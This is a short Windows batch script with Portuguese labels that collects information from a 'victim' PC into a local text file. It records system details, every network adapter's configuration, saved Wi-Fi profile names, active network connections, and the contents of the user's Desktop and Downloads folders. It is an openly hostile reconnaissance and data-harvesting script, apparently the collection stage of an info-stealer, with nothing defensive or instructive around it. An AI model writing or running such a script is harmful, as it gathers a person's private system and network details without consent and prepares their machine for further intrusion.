@echo off
set "OUTFILE=..\data\recollected_info.txt"
echo ----------------------------------------- > %OUTFILE%
echo [+] Info do PC da vitima %username% >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
systeminfo >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
echo [+] Todos os IPs locais >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
ipconfig /all >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
echo [+] Redes Wifi Armazenadas >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
netsh wlan show profiles >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
echo [+] Conexoes de rede >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
netstat >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
echo [+] Listagem do Desktop & Downloads >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
dir "C:\Users\%username%\Desktop" >> %OUTFILE%
dir "C:\Users\%username%\Downloads" >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
echo Extracao Completa >> %OUTFILE%
echo ----------------------------------------- >> %OUTFILE%
